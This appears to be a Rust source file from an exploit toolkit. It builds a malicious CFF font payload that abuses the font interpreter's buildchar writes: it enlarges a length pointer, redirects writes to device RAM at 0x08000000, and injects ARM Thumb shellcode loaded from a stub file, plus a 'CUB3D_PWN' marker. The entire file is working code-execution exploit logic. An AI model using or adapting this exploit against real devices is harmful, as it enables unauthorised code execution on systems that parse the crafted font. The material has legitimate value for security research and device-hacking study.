use crate::payload::exploit_config::ExploitConfig;
use crate::payload::{CffPayloadBuilder, Payload};
use capstone::arch::BuildsCapstone;
use capstone::{arch, Capstone};
use tracing::trace;

#[derive(Default)]
pub struct InitialCodeExecPayload {}

impl Payload for InitialCodeExecPayload {
    fn build_cff<Cfg: ExploitConfig>(&self, b: &mut CffPayloadBuilder) {
        // Lets make sure we have lots of space
        // Not fully needed but should help with blind reliability
        b.index_write(Cfg::OFFSET_BUILDCHAR_LEN_PTR, i32::MAX as u32);

        // Set our write target to start of ram
        b.index_write(Cfg::OFFSET_BUILDCHAR_PTR, 0x0800_0000_u32);

        let payload = std::fs::read("./scsi_shellcode/scsi-stub.bin").unwrap();

        {
            let cs = Capstone::new()
                .arm()
                .mode(arch::arm::ArchMode::Thumb)
                .detail(true)
                .build()
                .expect("Failed to create Capstone object");

            let insns = cs
                .disasm_all(&payload, 0x08005024)
                .expect("Failed to disassemble");

            for i in insns.as_ref() {
                trace!("{}", i);
            }
        }

        for (idx, t) in payload.chunks(4).enumerate() {
            let mut tmp = [0, 0, 0, 0];
            tmp[..t.len()].copy_from_slice(t);

            b.index_write_array(idx as u16 + 0x5024 / 4, tmp);
        }

        // Just a bit of fun
        {
            let s = b"CUB3D_PWN\0";
            const S_BASE: u16 = 0x1320;

            for (idx, t) in s.chunks(4).enumerate() {
                let mut tmp = [0, 0, 0, 0];
                tmp[..t.len()].copy_from_slice(t);

                b.index_write_array(idx as u16 + S_BASE / 4, tmp);
            }
        }
    }
}
